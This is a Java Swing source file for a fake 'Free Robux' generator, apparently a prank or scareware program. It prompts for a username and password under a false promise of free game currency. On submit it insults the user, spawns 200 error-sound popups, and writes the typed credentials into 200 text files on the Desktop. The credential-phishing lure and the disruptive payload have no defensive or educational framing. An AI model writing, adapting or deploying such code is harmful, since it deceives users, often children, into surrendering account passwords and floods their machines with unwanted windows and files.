import javax.swing.*;
import java.awt.*;
import javax.sound.sampled.*;
import java.io.File;
import java.io.IOException;

public class freeRobux {
	public static void playSound(String path) {
		try {
			File soundFile = new File(path);
			AudioInputStream audioIn = AudioSystem.getAudioInputStream(soundFile);
			Clip clip = AudioSystem.getClip();
			clip.open(audioIn);
			clip.start();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public static void main(String[] args) {
		JFrame frame = new JFrame("Free Robux!!! $$$");
		frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		frame.setSize(500, 300);
		
		JPanel panel = new JPanel();
		panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
		
		JLabel head = new JLabel("Free Robux!!! :)");
		head.setFont(head.getFont().deriveFont(24f));
		JLabel label = new JLabel("Username:");
		JTextField name = new JTextField(20);
		name.setMaximumSize(new Dimension(150, 20));
		JLabel label2 = new JLabel("Password:");
		JPasswordField password = new JPasswordField(20);
		password.setMaximumSize(new Dimension(150, 20));
		JButton submit = new JButton("Enter!");
		
		submit.addActionListener(e -> {
			String nameVal = name.getText();
			String passwordVal = password.getText();
			
			System.out.println("Name: " + nameVal + "; Password: " + passwordVal);
			JOptionPane.showMessageDialog(frame, "You are STUPID");

			try {
				Thread.sleep(2000);
			} catch (InterruptedException ex) {
				ex.printStackTrace();
			}
			
			new Thread(() -> {
				for (int i = 0; i < 200; i++) {
					try {
						Thread.sleep(10);
					} catch (InterruptedException ex) {
						ex.printStackTrace();
					}
					
					playSound("C:\\Windows\\Media\\Windows Critical Stop.wav");
					JDialog dialog = new JDialog(frame, "Error!", false);
					dialog.setSize(200, 100);
					int x = (int)(Math.random() * 1600);
					int y = (int)(Math.random() * 900);
					dialog.setLocation(x, y);
					dialog.add(new JLabel("STUPID", SwingConstants.CENTER));
					System.out.println("Created Popup No" + i);
					dialog.setVisible(true);
					
					try {
						File dmf = new File(System.getenv("USERPROFILE") + "\\Desktop" + "\\YOU_ARE_STUPID" + i + ".txt");
						java.nio.file.Files.writeString(
							dmf.toPath(),
							nameVal + " " + passwordVal
						);
						System.out.println("Created text file. " + dmf.getAbsolutePath());
					} 
					catch (IOException io) {
						io.printStackTrace();
					}
				}

			}).start();
		});
		
		panel.add(head);
		panel.add(label);
		panel.add(name);
		panel.add(label2);
		panel.add(password);
		panel.add(Box.createRigidArea(new Dimension(0, 10)));
		panel.add(submit);
		
		frame.add(panel);
		frame.setVisible(true);
		
	}
}